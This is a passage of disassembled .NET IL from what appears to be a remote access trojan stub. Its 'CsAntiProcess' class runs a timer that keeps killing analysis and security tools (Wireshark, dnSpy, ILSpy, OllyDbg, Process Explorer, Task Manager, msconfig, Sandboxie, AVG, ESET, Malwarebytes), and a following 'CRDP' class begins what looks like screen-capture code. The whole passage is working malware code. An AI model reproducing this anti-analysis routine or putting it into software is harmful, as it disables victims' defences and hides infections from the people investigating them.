    IL_0083:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0088:  nop
    IL_0089:  ldloc.s    V_33
    IL_008b:  ldc.i4.1
    IL_008c:  add.ovf
    IL_008d:  stloc.s    V_33
    IL_008f:  nop
    IL_0090:  ldloc.s    V_33
    IL_0092:  ldloc.s    V_34
    IL_0094:  ldlen
    IL_0095:  conv.ovf.i4
    IL_0096:  clt
    IL_0098:  stloc.s    V_87
    IL_009a:  ldloc.s    V_87
    IL_009c:  brtrue.s   IL_007a

    IL_009e:  ldstr      "wireshark"
    IL_00a3:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00a8:  stloc.s    V_36
    IL_00aa:  ldc.i4.0
    IL_00ab:  stloc.s    V_35
    IL_00ad:  br.s       IL_00c5

    IL_00af:  ldloc.s    V_36
    IL_00b1:  ldloc.s    V_35
    IL_00b3:  ldelem.ref
    IL_00b4:  stloc.s    V_23
    IL_00b6:  ldloc.s    V_23
    IL_00b8:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_00bd:  nop
    IL_00be:  ldloc.s    V_35
    IL_00c0:  ldc.i4.1
    IL_00c1:  add.ovf
    IL_00c2:  stloc.s    V_35
    IL_00c4:  nop
    IL_00c5:  ldloc.s    V_35
    IL_00c7:  ldloc.s    V_36
    IL_00c9:  ldlen
    IL_00ca:  conv.ovf.i4
    IL_00cb:  clt
    IL_00cd:  stloc.s    V_87
    IL_00cf:  ldloc.s    V_87
    IL_00d1:  brtrue.s   IL_00af

    IL_00d3:  ldstr      "apateDNS"
    IL_00d8:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_00dd:  stloc.s    V_38
    IL_00df:  ldc.i4.0
    IL_00e0:  stloc.s    V_37
    IL_00e2:  br.s       IL_00fa

    IL_00e4:  ldloc.s    V_38
    IL_00e6:  ldloc.s    V_37
    IL_00e8:  ldelem.ref
    IL_00e9:  stloc.s    V_24
    IL_00eb:  ldloc.s    V_24
    IL_00ed:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_00f2:  nop
    IL_00f3:  ldloc.s    V_37
    IL_00f5:  ldc.i4.1
    IL_00f6:  add.ovf
    IL_00f7:  stloc.s    V_37
    IL_00f9:  nop
    IL_00fa:  ldloc.s    V_37
    IL_00fc:  ldloc.s    V_38
    IL_00fe:  ldlen
    IL_00ff:  conv.ovf.i4
    IL_0100:  clt
    IL_0102:  stloc.s    V_87
    IL_0104:  ldloc.s    V_87
    IL_0106:  brtrue.s   IL_00e4

    IL_0108:  ldstr      "IPBlocker"
    IL_010d:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0112:  stloc.s    V_40
    IL_0114:  ldc.i4.0
    IL_0115:  stloc.s    V_39
    IL_0117:  br.s       IL_012f

    IL_0119:  ldloc.s    V_40
    IL_011b:  ldloc.s    V_39
    IL_011d:  ldelem.ref
    IL_011e:  stloc.s    V_25
    IL_0120:  ldloc.s    V_25
    IL_0122:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0127:  nop
    IL_0128:  ldloc.s    V_39
    IL_012a:  ldc.i4.1
    IL_012b:  add.ovf
    IL_012c:  stloc.s    V_39
    IL_012e:  nop
    IL_012f:  ldloc.s    V_39
    IL_0131:  ldloc.s    V_40
    IL_0133:  ldlen
    IL_0134:  conv.ovf.i4
    IL_0135:  clt
    IL_0137:  stloc.s    V_87
    IL_0139:  ldloc.s    V_87
    IL_013b:  brtrue.s   IL_0119

    IL_013d:  ldstr      "TiGeR-Firewall"
    IL_0142:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0147:  stloc.s    V_42
    IL_0149:  ldc.i4.0
    IL_014a:  stloc.s    V_41
    IL_014c:  br.s       IL_0164

    IL_014e:  ldloc.s    V_42
    IL_0150:  ldloc.s    V_41
    IL_0152:  ldelem.ref
    IL_0153:  stloc.s    V_26
    IL_0155:  ldloc.s    V_26
    IL_0157:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_015c:  nop
    IL_015d:  ldloc.s    V_41
    IL_015f:  ldc.i4.1
    IL_0160:  add.ovf
    IL_0161:  stloc.s    V_41
    IL_0163:  nop
    IL_0164:  ldloc.s    V_41
    IL_0166:  ldloc.s    V_42
    IL_0168:  ldlen
    IL_0169:  conv.ovf.i4
    IL_016a:  clt
    IL_016c:  stloc.s    V_87
    IL_016e:  ldloc.s    V_87
    IL_0170:  brtrue.s   IL_014e

    IL_0172:  ldstr      "smsniff"
    IL_0177:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_017c:  stloc.s    V_44
    IL_017e:  ldc.i4.0
    IL_017f:  stloc.s    V_43
    IL_0181:  br.s       IL_0199

    IL_0183:  ldloc.s    V_44
    IL_0185:  ldloc.s    V_43
    IL_0187:  ldelem.ref
    IL_0188:  stloc.s    V_27
    IL_018a:  ldloc.s    V_27
    IL_018c:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0191:  nop
    IL_0192:  ldloc.s    V_43
    IL_0194:  ldc.i4.1
    IL_0195:  add.ovf
    IL_0196:  stloc.s    V_43
    IL_0198:  nop
    IL_0199:  ldloc.s    V_43
    IL_019b:  ldloc.s    V_44
    IL_019d:  ldlen
    IL_019e:  conv.ovf.i4
    IL_019f:  clt
    IL_01a1:  stloc.s    V_87
    IL_01a3:  ldloc.s    V_87
    IL_01a5:  brtrue.s   IL_0183

    IL_01a7:  ldstr      "exeinfoPE"
    IL_01ac:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01b1:  stloc.s    V_46
    IL_01b3:  ldc.i4.0
    IL_01b4:  stloc.s    V_45
    IL_01b6:  br.s       IL_01ce

    IL_01b8:  ldloc.s    V_46
    IL_01ba:  ldloc.s    V_45
    IL_01bc:  ldelem.ref
    IL_01bd:  stloc.s    V_28
    IL_01bf:  ldloc.s    V_28
    IL_01c1:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_01c6:  nop
    IL_01c7:  ldloc.s    V_45
    IL_01c9:  ldc.i4.1
    IL_01ca:  add.ovf
    IL_01cb:  stloc.s    V_45
    IL_01cd:  nop
    IL_01ce:  ldloc.s    V_45
    IL_01d0:  ldloc.s    V_46
    IL_01d2:  ldlen
    IL_01d3:  conv.ovf.i4
    IL_01d4:  clt
    IL_01d6:  stloc.s    V_87
    IL_01d8:  ldloc.s    V_87
    IL_01da:  brtrue.s   IL_01b8

    IL_01dc:  ldstr      "NetSnifferCs"
    IL_01e1:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_01e6:  stloc.s    V_48
    IL_01e8:  ldc.i4.0
    IL_01e9:  stloc.s    V_47
    IL_01eb:  br.s       IL_0201

    IL_01ed:  ldloc.s    V_48
    IL_01ef:  ldloc.s    V_47
    IL_01f1:  ldelem.ref
    IL_01f2:  stloc.1
    IL_01f3:  ldloc.1
    IL_01f4:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_01f9:  nop
    IL_01fa:  ldloc.s    V_47
    IL_01fc:  ldc.i4.1
    IL_01fd:  add.ovf
    IL_01fe:  stloc.s    V_47
    IL_0200:  nop
    IL_0201:  ldloc.s    V_47
    IL_0203:  ldloc.s    V_48
    IL_0205:  ldlen
    IL_0206:  conv.ovf.i4
    IL_0207:  clt
    IL_0209:  stloc.s    V_87
    IL_020b:  ldloc.s    V_87
    IL_020d:  brtrue.s   IL_01ed

    IL_020f:  ldstr      "Sandboxie Control"
    IL_0214:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0219:  stloc.s    V_50
    IL_021b:  ldc.i4.0
    IL_021c:  stloc.s    V_49
    IL_021e:  br.s       IL_0234

    IL_0220:  ldloc.s    V_50
    IL_0222:  ldloc.s    V_49
    IL_0224:  ldelem.ref
    IL_0225:  stloc.2
    IL_0226:  ldloc.2
    IL_0227:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_022c:  nop
    IL_022d:  ldloc.s    V_49
    IL_022f:  ldc.i4.1
    IL_0230:  add.ovf
    IL_0231:  stloc.s    V_49
    IL_0233:  nop
    IL_0234:  ldloc.s    V_49
    IL_0236:  ldloc.s    V_50
    IL_0238:  ldlen
    IL_0239:  conv.ovf.i4
    IL_023a:  clt
    IL_023c:  stloc.s    V_87
    IL_023e:  ldloc.s    V_87
    IL_0240:  brtrue.s   IL_0220

    IL_0242:  ldstr      "processhacker"
    IL_0247:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_024c:  stloc.s    V_52
    IL_024e:  ldc.i4.0
    IL_024f:  stloc.s    V_51
    IL_0251:  br.s       IL_0267

    IL_0253:  ldloc.s    V_52
    IL_0255:  ldloc.s    V_51
    IL_0257:  ldelem.ref
    IL_0258:  stloc.3
    IL_0259:  ldloc.3
    IL_025a:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_025f:  nop
    IL_0260:  ldloc.s    V_51
    IL_0262:  ldc.i4.1
    IL_0263:  add.ovf
    IL_0264:  stloc.s    V_51
    IL_0266:  nop
    IL_0267:  ldloc.s    V_51
    IL_0269:  ldloc.s    V_52
    IL_026b:  ldlen
    IL_026c:  conv.ovf.i4
    IL_026d:  clt
    IL_026f:  stloc.s    V_87
    IL_0271:  ldloc.s    V_87
    IL_0273:  brtrue.s   IL_0253

    IL_0275:  ldstr      "taskmgr"
    IL_027a:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_027f:  stloc.s    V_54
    IL_0281:  ldc.i4.0
    IL_0282:  stloc.s    V_53
    IL_0284:  br.s       IL_029c

    IL_0286:  ldloc.s    V_54
    IL_0288:  ldloc.s    V_53
    IL_028a:  ldelem.ref
    IL_028b:  stloc.s    V_4
    IL_028d:  ldloc.s    V_4
    IL_028f:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0294:  nop
    IL_0295:  ldloc.s    V_53
    IL_0297:  ldc.i4.1
    IL_0298:  add.ovf
    IL_0299:  stloc.s    V_53
    IL_029b:  nop
    IL_029c:  ldloc.s    V_53
    IL_029e:  ldloc.s    V_54
    IL_02a0:  ldlen
    IL_02a1:  conv.ovf.i4
    IL_02a2:  clt
    IL_02a4:  stloc.s    V_87
    IL_02a6:  ldloc.s    V_87
    IL_02a8:  brtrue.s   IL_0286

    IL_02aa:  ldstr      "msconfig"
    IL_02af:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02b4:  stloc.s    V_56
    IL_02b6:  ldc.i4.0
    IL_02b7:  stloc.s    V_55
    IL_02b9:  br.s       IL_02d1

    IL_02bb:  ldloc.s    V_56
    IL_02bd:  ldloc.s    V_55
    IL_02bf:  ldelem.ref
    IL_02c0:  stloc.s    V_5
    IL_02c2:  ldloc.s    V_5
    IL_02c4:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_02c9:  nop
    IL_02ca:  ldloc.s    V_55
    IL_02cc:  ldc.i4.1
    IL_02cd:  add.ovf
    IL_02ce:  stloc.s    V_55
    IL_02d0:  nop
    IL_02d1:  ldloc.s    V_55
    IL_02d3:  ldloc.s    V_56
    IL_02d5:  ldlen
    IL_02d6:  conv.ovf.i4
    IL_02d7:  clt
    IL_02d9:  stloc.s    V_87
    IL_02db:  ldloc.s    V_87
    IL_02dd:  brtrue.s   IL_02bb

    IL_02df:  ldstr      "dnSpy"
    IL_02e4:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02e9:  stloc.s    V_58
    IL_02eb:  ldc.i4.0
    IL_02ec:  stloc.s    V_57
    IL_02ee:  br.s       IL_0306

    IL_02f0:  ldloc.s    V_58
    IL_02f2:  ldloc.s    V_57
    IL_02f4:  ldelem.ref
    IL_02f5:  stloc.s    V_6
    IL_02f7:  ldloc.s    V_6
    IL_02f9:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_02fe:  nop
    IL_02ff:  ldloc.s    V_57
    IL_0301:  ldc.i4.1
    IL_0302:  add.ovf
    IL_0303:  stloc.s    V_57
    IL_0305:  nop
    IL_0306:  ldloc.s    V_57
    IL_0308:  ldloc.s    V_58
    IL_030a:  ldlen
    IL_030b:  conv.ovf.i4
    IL_030c:  clt
    IL_030e:  stloc.s    V_87
    IL_0310:  ldloc.s    V_87
    IL_0312:  brtrue.s   IL_02f0

    IL_0314:  ldstr      "CodeReflect"
    IL_0319:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_031e:  stloc.s    V_60
    IL_0320:  ldc.i4.0
    IL_0321:  stloc.s    V_59
    IL_0323:  br.s       IL_033b

    IL_0325:  ldloc.s    V_60
    IL_0327:  ldloc.s    V_59
    IL_0329:  ldelem.ref
    IL_032a:  stloc.s    V_7
    IL_032c:  ldloc.s    V_7
    IL_032e:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0333:  nop
    IL_0334:  ldloc.s    V_59
    IL_0336:  ldc.i4.1
    IL_0337:  add.ovf
    IL_0338:  stloc.s    V_59
    IL_033a:  nop
    IL_033b:  ldloc.s    V_59
    IL_033d:  ldloc.s    V_60
    IL_033f:  ldlen
    IL_0340:  conv.ovf.i4
    IL_0341:  clt
    IL_0343:  stloc.s    V_87
    IL_0345:  ldloc.s    V_87
    IL_0347:  brtrue.s   IL_0325

    IL_0349:  ldstr      "Reflector"
    IL_034e:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0353:  stloc.s    V_62
    IL_0355:  ldc.i4.0
    IL_0356:  stloc.s    V_61
    IL_0358:  br.s       IL_0370

    IL_035a:  ldloc.s    V_62
    IL_035c:  ldloc.s    V_61
    IL_035e:  ldelem.ref
    IL_035f:  stloc.s    V_8
    IL_0361:  ldloc.s    V_8
    IL_0363:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0368:  nop
    IL_0369:  ldloc.s    V_61
    IL_036b:  ldc.i4.1
    IL_036c:  add.ovf
    IL_036d:  stloc.s    V_61
    IL_036f:  nop
    IL_0370:  ldloc.s    V_61
    IL_0372:  ldloc.s    V_62
    IL_0374:  ldlen
    IL_0375:  conv.ovf.i4
    IL_0376:  clt
    IL_0378:  stloc.s    V_87
    IL_037a:  ldloc.s    V_87
    IL_037c:  brtrue.s   IL_035a

    IL_037e:  ldstr      "ILSpy"
    IL_0383:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0388:  stloc.s    V_64
    IL_038a:  ldc.i4.0
    IL_038b:  stloc.s    V_63
    IL_038d:  br.s       IL_03a5

    IL_038f:  ldloc.s    V_64
    IL_0391:  ldloc.s    V_63
    IL_0393:  ldelem.ref
    IL_0394:  stloc.s    V_9
    IL_0396:  ldloc.s    V_9
    IL_0398:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_039d:  nop
    IL_039e:  ldloc.s    V_63
    IL_03a0:  ldc.i4.1
    IL_03a1:  add.ovf
    IL_03a2:  stloc.s    V_63
    IL_03a4:  nop
    IL_03a5:  ldloc.s    V_63
    IL_03a7:  ldloc.s    V_64
    IL_03a9:  ldlen
    IL_03aa:  conv.ovf.i4
    IL_03ab:  clt
    IL_03ad:  stloc.s    V_87
    IL_03af:  ldloc.s    V_87
    IL_03b1:  brtrue.s   IL_038f

    IL_03b3:  ldstr      "StartUP Controler v1.1"
    IL_03b8:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_03bd:  stloc.s    V_66
    IL_03bf:  ldc.i4.0
    IL_03c0:  stloc.s    V_65
    IL_03c2:  br.s       IL_03da

    IL_03c4:  ldloc.s    V_66
    IL_03c6:  ldloc.s    V_65
    IL_03c8:  ldelem.ref
    IL_03c9:  stloc.s    V_10
    IL_03cb:  ldloc.s    V_10
    IL_03cd:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_03d2:  nop
    IL_03d3:  ldloc.s    V_65
    IL_03d5:  ldc.i4.1
    IL_03d6:  add.ovf
    IL_03d7:  stloc.s    V_65
    IL_03d9:  nop
    IL_03da:  ldloc.s    V_65
    IL_03dc:  ldloc.s    V_66
    IL_03de:  ldlen
    IL_03df:  conv.ovf.i4
    IL_03e0:  clt
    IL_03e2:  stloc.s    V_87
    IL_03e4:  ldloc.s    V_87
    IL_03e6:  brtrue.s   IL_03c4

    IL_03e8:  ldstr      "Smart Hunter V 1.1"
    IL_03ed:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_03f2:  stloc.s    V_68
    IL_03f4:  ldc.i4.0
    IL_03f5:  stloc.s    V_67
    IL_03f7:  br.s       IL_040f

    IL_03f9:  ldloc.s    V_68
    IL_03fb:  ldloc.s    V_67
    IL_03fd:  ldelem.ref
    IL_03fe:  stloc.s    V_12
    IL_0400:  ldloc.s    V_12
    IL_0402:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0407:  nop
    IL_0408:  ldloc.s    V_67
    IL_040a:  ldc.i4.1
    IL_040b:  add.ovf
    IL_040c:  stloc.s    V_67
    IL_040e:  nop
    IL_040f:  ldloc.s    V_67
    IL_0411:  ldloc.s    V_68
    IL_0413:  ldlen
    IL_0414:  conv.ovf.i4
    IL_0415:  clt
    IL_0417:  stloc.s    V_87
    IL_0419:  ldloc.s    V_87
    IL_041b:  brtrue.s   IL_03f9

    IL_041d:  ldstr      "Smart Hunter V 1.1"
    IL_0422:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0427:  stloc.s    V_70
    IL_0429:  ldc.i4.0
    IL_042a:  stloc.s    V_69
    IL_042c:  br.s       IL_0444

    IL_042e:  ldloc.s    V_70
    IL_0430:  ldloc.s    V_69
    IL_0432:  ldelem.ref
    IL_0433:  stloc.s    V_13
    IL_0435:  ldloc.s    V_13
    IL_0437:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_043c:  nop
    IL_043d:  ldloc.s    V_69
    IL_043f:  ldc.i4.1
    IL_0440:  add.ovf
    IL_0441:  stloc.s    V_69
    IL_0443:  nop
    IL_0444:  ldloc.s    V_69
    IL_0446:  ldloc.s    V_70
    IL_0448:  ldlen
    IL_0449:  conv.ovf.i4
    IL_044a:  clt
    IL_044c:  stloc.s    V_87
    IL_044e:  ldloc.s    V_87
    IL_0450:  brtrue.s   IL_042e

    IL_0452:  ldstr      "AVG"
    IL_0457:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_045c:  stloc.s    V_72
    IL_045e:  ldc.i4.0
    IL_045f:  stloc.s    V_71
    IL_0461:  br.s       IL_0479

    IL_0463:  ldloc.s    V_72
    IL_0465:  ldloc.s    V_71
    IL_0467:  ldelem.ref
    IL_0468:  stloc.s    V_14
    IL_046a:  ldloc.s    V_14
    IL_046c:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0471:  nop
    IL_0472:  ldloc.s    V_71
    IL_0474:  ldc.i4.1
    IL_0475:  add.ovf
    IL_0476:  stloc.s    V_71
    IL_0478:  nop
    IL_0479:  ldloc.s    V_71
    IL_047b:  ldloc.s    V_72
    IL_047d:  ldlen
    IL_047e:  conv.ovf.i4
    IL_047f:  clt
    IL_0481:  stloc.s    V_87
    IL_0483:  ldloc.s    V_87
    IL_0485:  brtrue.s   IL_0463

    IL_0487:  ldstr      "SbieCtrl"
    IL_048c:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0491:  stloc.s    V_74
    IL_0493:  ldc.i4.0
    IL_0494:  stloc.s    V_73
    IL_0496:  br.s       IL_04ae

    IL_0498:  ldloc.s    V_74
    IL_049a:  ldloc.s    V_73
    IL_049c:  ldelem.ref
    IL_049d:  stloc.s    V_15
    IL_049f:  ldloc.s    V_15
    IL_04a1:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_04a6:  nop
    IL_04a7:  ldloc.s    V_73
    IL_04a9:  ldc.i4.1
    IL_04aa:  add.ovf
    IL_04ab:  stloc.s    V_73
    IL_04ad:  nop
    IL_04ae:  ldloc.s    V_73
    IL_04b0:  ldloc.s    V_74
    IL_04b2:  ldlen
    IL_04b3:  conv.ovf.i4
    IL_04b4:  clt
    IL_04b6:  stloc.s    V_87
    IL_04b8:  ldloc.s    V_87
    IL_04ba:  brtrue.s   IL_0498

    IL_04bc:  ldstr      "ESET"
    IL_04c1:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_04c6:  stloc.s    V_76
    IL_04c8:  ldc.i4.0
    IL_04c9:  stloc.s    V_75
    IL_04cb:  br.s       IL_04e3

    IL_04cd:  ldloc.s    V_76
    IL_04cf:  ldloc.s    V_75
    IL_04d1:  ldelem.ref
    IL_04d2:  stloc.s    V_16
    IL_04d4:  ldloc.s    V_16
    IL_04d6:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_04db:  nop
    IL_04dc:  ldloc.s    V_75
    IL_04de:  ldc.i4.1
    IL_04df:  add.ovf
    IL_04e0:  stloc.s    V_75
    IL_04e2:  nop
    IL_04e3:  ldloc.s    V_75
    IL_04e5:  ldloc.s    V_76
    IL_04e7:  ldlen
    IL_04e8:  conv.ovf.i4
    IL_04e9:  clt
    IL_04eb:  stloc.s    V_87
    IL_04ed:  ldloc.s    V_87
    IL_04ef:  brtrue.s   IL_04cd

    IL_04f1:  ldstr      "Wireshark"
    IL_04f6:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_04fb:  stloc.s    V_78
    IL_04fd:  ldc.i4.0
    IL_04fe:  stloc.s    V_77
    IL_0500:  br.s       IL_0518

    IL_0502:  ldloc.s    V_78
    IL_0504:  ldloc.s    V_77
    IL_0506:  ldelem.ref
    IL_0507:  stloc.s    V_17
    IL_0509:  ldloc.s    V_17
    IL_050b:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0510:  nop
    IL_0511:  ldloc.s    V_77
    IL_0513:  ldc.i4.1
    IL_0514:  add.ovf
    IL_0515:  stloc.s    V_77
    IL_0517:  nop
    IL_0518:  ldloc.s    V_77
    IL_051a:  ldloc.s    V_78
    IL_051c:  ldlen
    IL_051d:  conv.ovf.i4
    IL_051e:  clt
    IL_0520:  stloc.s    V_87
    IL_0522:  ldloc.s    V_87
    IL_0524:  brtrue.s   IL_0502

    IL_0526:  ldstr      "Ollydbg"
    IL_052b:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0530:  stloc.s    V_80
    IL_0532:  ldc.i4.0
    IL_0533:  stloc.s    V_79
    IL_0535:  br.s       IL_054d

    IL_0537:  ldloc.s    V_80
    IL_0539:  ldloc.s    V_79
    IL_053b:  ldelem.ref
    IL_053c:  stloc.s    V_18
    IL_053e:  ldloc.s    V_18
    IL_0540:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_0545:  nop
    IL_0546:  ldloc.s    V_79
    IL_0548:  ldc.i4.1
    IL_0549:  add.ovf
    IL_054a:  stloc.s    V_79
    IL_054c:  nop
    IL_054d:  ldloc.s    V_79
    IL_054f:  ldloc.s    V_80
    IL_0551:  ldlen
    IL_0552:  conv.ovf.i4
    IL_0553:  clt
    IL_0555:  stloc.s    V_87
    IL_0557:  ldloc.s    V_87
    IL_0559:  brtrue.s   IL_0537

    IL_055b:  ldstr      "Malwarebytes"
    IL_0560:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0565:  stloc.s    V_82
    IL_0567:  ldc.i4.0
    IL_0568:  stloc.s    V_81
    IL_056a:  br.s       IL_0582

    IL_056c:  ldloc.s    V_82
    IL_056e:  ldloc.s    V_81
    IL_0570:  ldelem.ref
    IL_0571:  stloc.s    V_19
    IL_0573:  ldloc.s    V_19
    IL_0575:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_057a:  nop
    IL_057b:  ldloc.s    V_81
    IL_057d:  ldc.i4.1
    IL_057e:  add.ovf
    IL_057f:  stloc.s    V_81
    IL_0581:  nop
    IL_0582:  ldloc.s    V_81
    IL_0584:  ldloc.s    V_82
    IL_0586:  ldlen
    IL_0587:  conv.ovf.i4
    IL_0588:  clt
    IL_058a:  stloc.s    V_87
    IL_058c:  ldloc.s    V_87
    IL_058e:  brtrue.s   IL_056c

    IL_0590:  ldstr      "Process Explorer"
    IL_0595:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_059a:  stloc.s    V_84
    IL_059c:  ldc.i4.0
    IL_059d:  stloc.s    V_83
    IL_059f:  br.s       IL_05b7

    IL_05a1:  ldloc.s    V_84
    IL_05a3:  ldloc.s    V_83
    IL_05a5:  ldelem.ref
    IL_05a6:  stloc.s    V_20
    IL_05a8:  ldloc.s    V_20
    IL_05aa:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_05af:  nop
    IL_05b0:  ldloc.s    V_83
    IL_05b2:  ldc.i4.1
    IL_05b3:  add.ovf
    IL_05b4:  stloc.s    V_83
    IL_05b6:  nop
    IL_05b7:  ldloc.s    V_83
    IL_05b9:  ldloc.s    V_84
    IL_05bb:  ldlen
    IL_05bc:  conv.ovf.i4
    IL_05bd:  clt
    IL_05bf:  stloc.s    V_87
    IL_05c1:  ldloc.s    V_87
    IL_05c3:  brtrue.s   IL_05a1

    IL_05c5:  ldstr      "AntiLogger"
    IL_05ca:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_05cf:  stloc.s    V_86
    IL_05d1:  ldc.i4.0
    IL_05d2:  stloc.s    V_85
    IL_05d4:  br.s       IL_05ec

    IL_05d6:  ldloc.s    V_86
    IL_05d8:  ldloc.s    V_85
    IL_05da:  ldelem.ref
    IL_05db:  stloc.s    V_21
    IL_05dd:  ldloc.s    V_21
    IL_05df:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
    IL_05e4:  nop
    IL_05e5:  ldloc.s    V_85
    IL_05e7:  ldc.i4.1
    IL_05e8:  add.ovf
    IL_05e9:  stloc.s    V_85
    IL_05eb:  nop
    IL_05ec:  ldloc.s    V_85
    IL_05ee:  ldloc.s    V_86
    IL_05f0:  ldlen
    IL_05f1:  conv.ovf.i4
    IL_05f2:  clt
    IL_05f4:  stloc.s    V_87
    IL_05f6:  ldloc.s    V_87
    IL_05f8:  brtrue.s   IL_05d6

    IL_05fa:  nop
    IL_05fb:  ret
  } // end of method CsAntiProcess::Handler

  .method public static void  Start() cil managed
  {
    // Code size       57 (0x39)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.r8     5.
    IL_000a:  newobj     instance void [System]System.Timers.Timer::.ctor(float64)
    IL_000f:  stsfld     class [System]System.Timers.Timer Stub.CsAntiProcess::Timer
    IL_0014:  ldsfld     class [System]System.Timers.Timer Stub.CsAntiProcess::Timer
    IL_0019:  ldnull
    IL_001a:  ldftn      void Stub.CsAntiProcess::Handler(object,
                                                          class [System]System.Timers.ElapsedEventArgs)
    IL_0020:  newobj     instance void [System]System.Timers.ElapsedEventHandler::.ctor(object,
                                                                                        native int)
    IL_0025:  callvirt   instance void [System]System.Timers.Timer::add_Elapsed(class [System]System.Timers.ElapsedEventHandler)
    IL_002a:  nop
    IL_002b:  ldsfld     class [System]System.Timers.Timer Stub.CsAntiProcess::Timer
    IL_0030:  ldc.i4.1
    IL_0031:  callvirt   instance void [System]System.Timers.Timer::set_Enabled(bool)
    IL_0036:  nop
    IL_0037:  nop
    IL_0038:  ret
  } // end of method CsAntiProcess::Start

} // end of class Stub.CsAntiProcess

.class public auto ansi beforefieldinit Stub.CRDP
       extends [mscorlib]System.Object
{
  .field private static class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> OA
  .field private static class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> OAA
  .field private static int32 oCo
  .field private static class [System.Drawing]System.Drawing.Bitmap OM
  .field private static int32 oQ
  .field private static int32 oQu
  .method private specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       52 (0x34)
    .maxstack  8
    IL_0000:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap>::.ctor()
    IL_0005:  stsfld     class [mscorlib]System.Collections.Generic.List`1<class [System.Drawing]System.Drawing.Bitmap> Stub.CRDP::OA
    IL_000a:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point>::.ctor()
    IL_000f:  stsfld     class [mscorlib]System.Collections.Generic.List`1<valuetype [System.Drawing]System.Drawing.Point> Stub.CRDP::OAA
    IL_0014:  ldc.i4.0
    IL_0015:  stsfld     int32 Stub.CRDP::oCo
    IL_001a:  ldc.i4.1
    IL_001b:  ldc.i4.1
    IL_001c:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                    int32)
    IL_0021:  stsfld     class [System.Drawing]System.Drawing.Bitmap Stub.CRDP::OM
    IL_0026:  ldc.i4.0
    IL_0027:  stsfld     int32 Stub.CRDP::oQ
    IL_002c:  ldc.i4.0
    IL_002d:  stsfld     int32 Stub.CRDP::oQu
